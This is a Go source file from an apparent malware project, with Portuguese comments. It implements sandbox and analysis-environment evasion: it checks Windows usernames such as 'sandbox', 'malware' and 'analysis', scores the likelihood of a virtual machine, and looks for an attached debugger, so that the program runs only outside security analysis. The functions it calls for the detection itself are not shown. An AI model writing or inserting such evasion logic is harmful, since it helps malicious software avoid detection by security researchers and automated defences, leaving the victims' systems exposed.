package stealth

import (
	"os"
	"runtime"
	"strings"
)

// IsEnvironmentSafe verifica se o ambiente é seguro para execução
// v2.0: Implementação AVANÇADA com detecção multi-camadas
func IsEnvironmentSafe() bool {
	// 1. Verificar se está em debug mode via variável de ambiente
	if os.Getenv("SENTINEL_DEBUG") == "1" {
		// Em modo debug, sempre executar
		return true
	}

	// 2. Verificar username suspeito (sandboxes usam nomes conhecidos)
	if checkSuspiciousUsername() {
		return false
	}

	// 3. DETECÇÃO AVANÇADA DE VM - Usa múltiplas heurísticas
	vmResult := DetectVM()

	// Se confiança >= 30%, provavelmente é VM
	if vmResult.IsVM {
		return false
	}

	// 4. Se confiança entre 20-29%, ser cauteloso
	if vmResult.Confidence >= 20 {
		// Fazer verificações adicionais
		if checkDebuggerPresent() {
			return false
		}
	}

	return true
}

// checkSuspiciousUsername verifica se o username indica sandbox/análise
func checkSuspiciousUsername() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	username := strings.ToLower(os.Getenv("USERNAME"))

	suspiciousNames := []string{
		"sandbox",
		"malware",
		"virus",
		"test",
		"sample",
		"analysis",
		"admin",      // Alguns sandboxes usam admin
		"user",       // Nome genérico usado por VMs
		"vmware",
		"vbox",
		"virtual",
	}

	for _, name := range suspiciousNames {
		if strings.Contains(username, name) {
			return true
		}
	}

	return false
}

// checkDebuggerPresent verifica se há debugger anexado (básico)
func checkDebuggerPresent() bool {
	// Verificação simples via timing
	// Debuggers causam delays nas instruções
	return IsDebuggerPresent()
}

// CheckVM verifica se está rodando em VM (função pública)
func CheckVM() bool {
	return IsVirtualEnvironment()
}

// CheckSandbox verifica se está em ambiente de sandbox (função pública)
func CheckSandbox() bool {
	result := DetectVM()
	// Sandbox geralmente tem confiança alta + processos suspeitos
	return result.Confidence >= 40
}
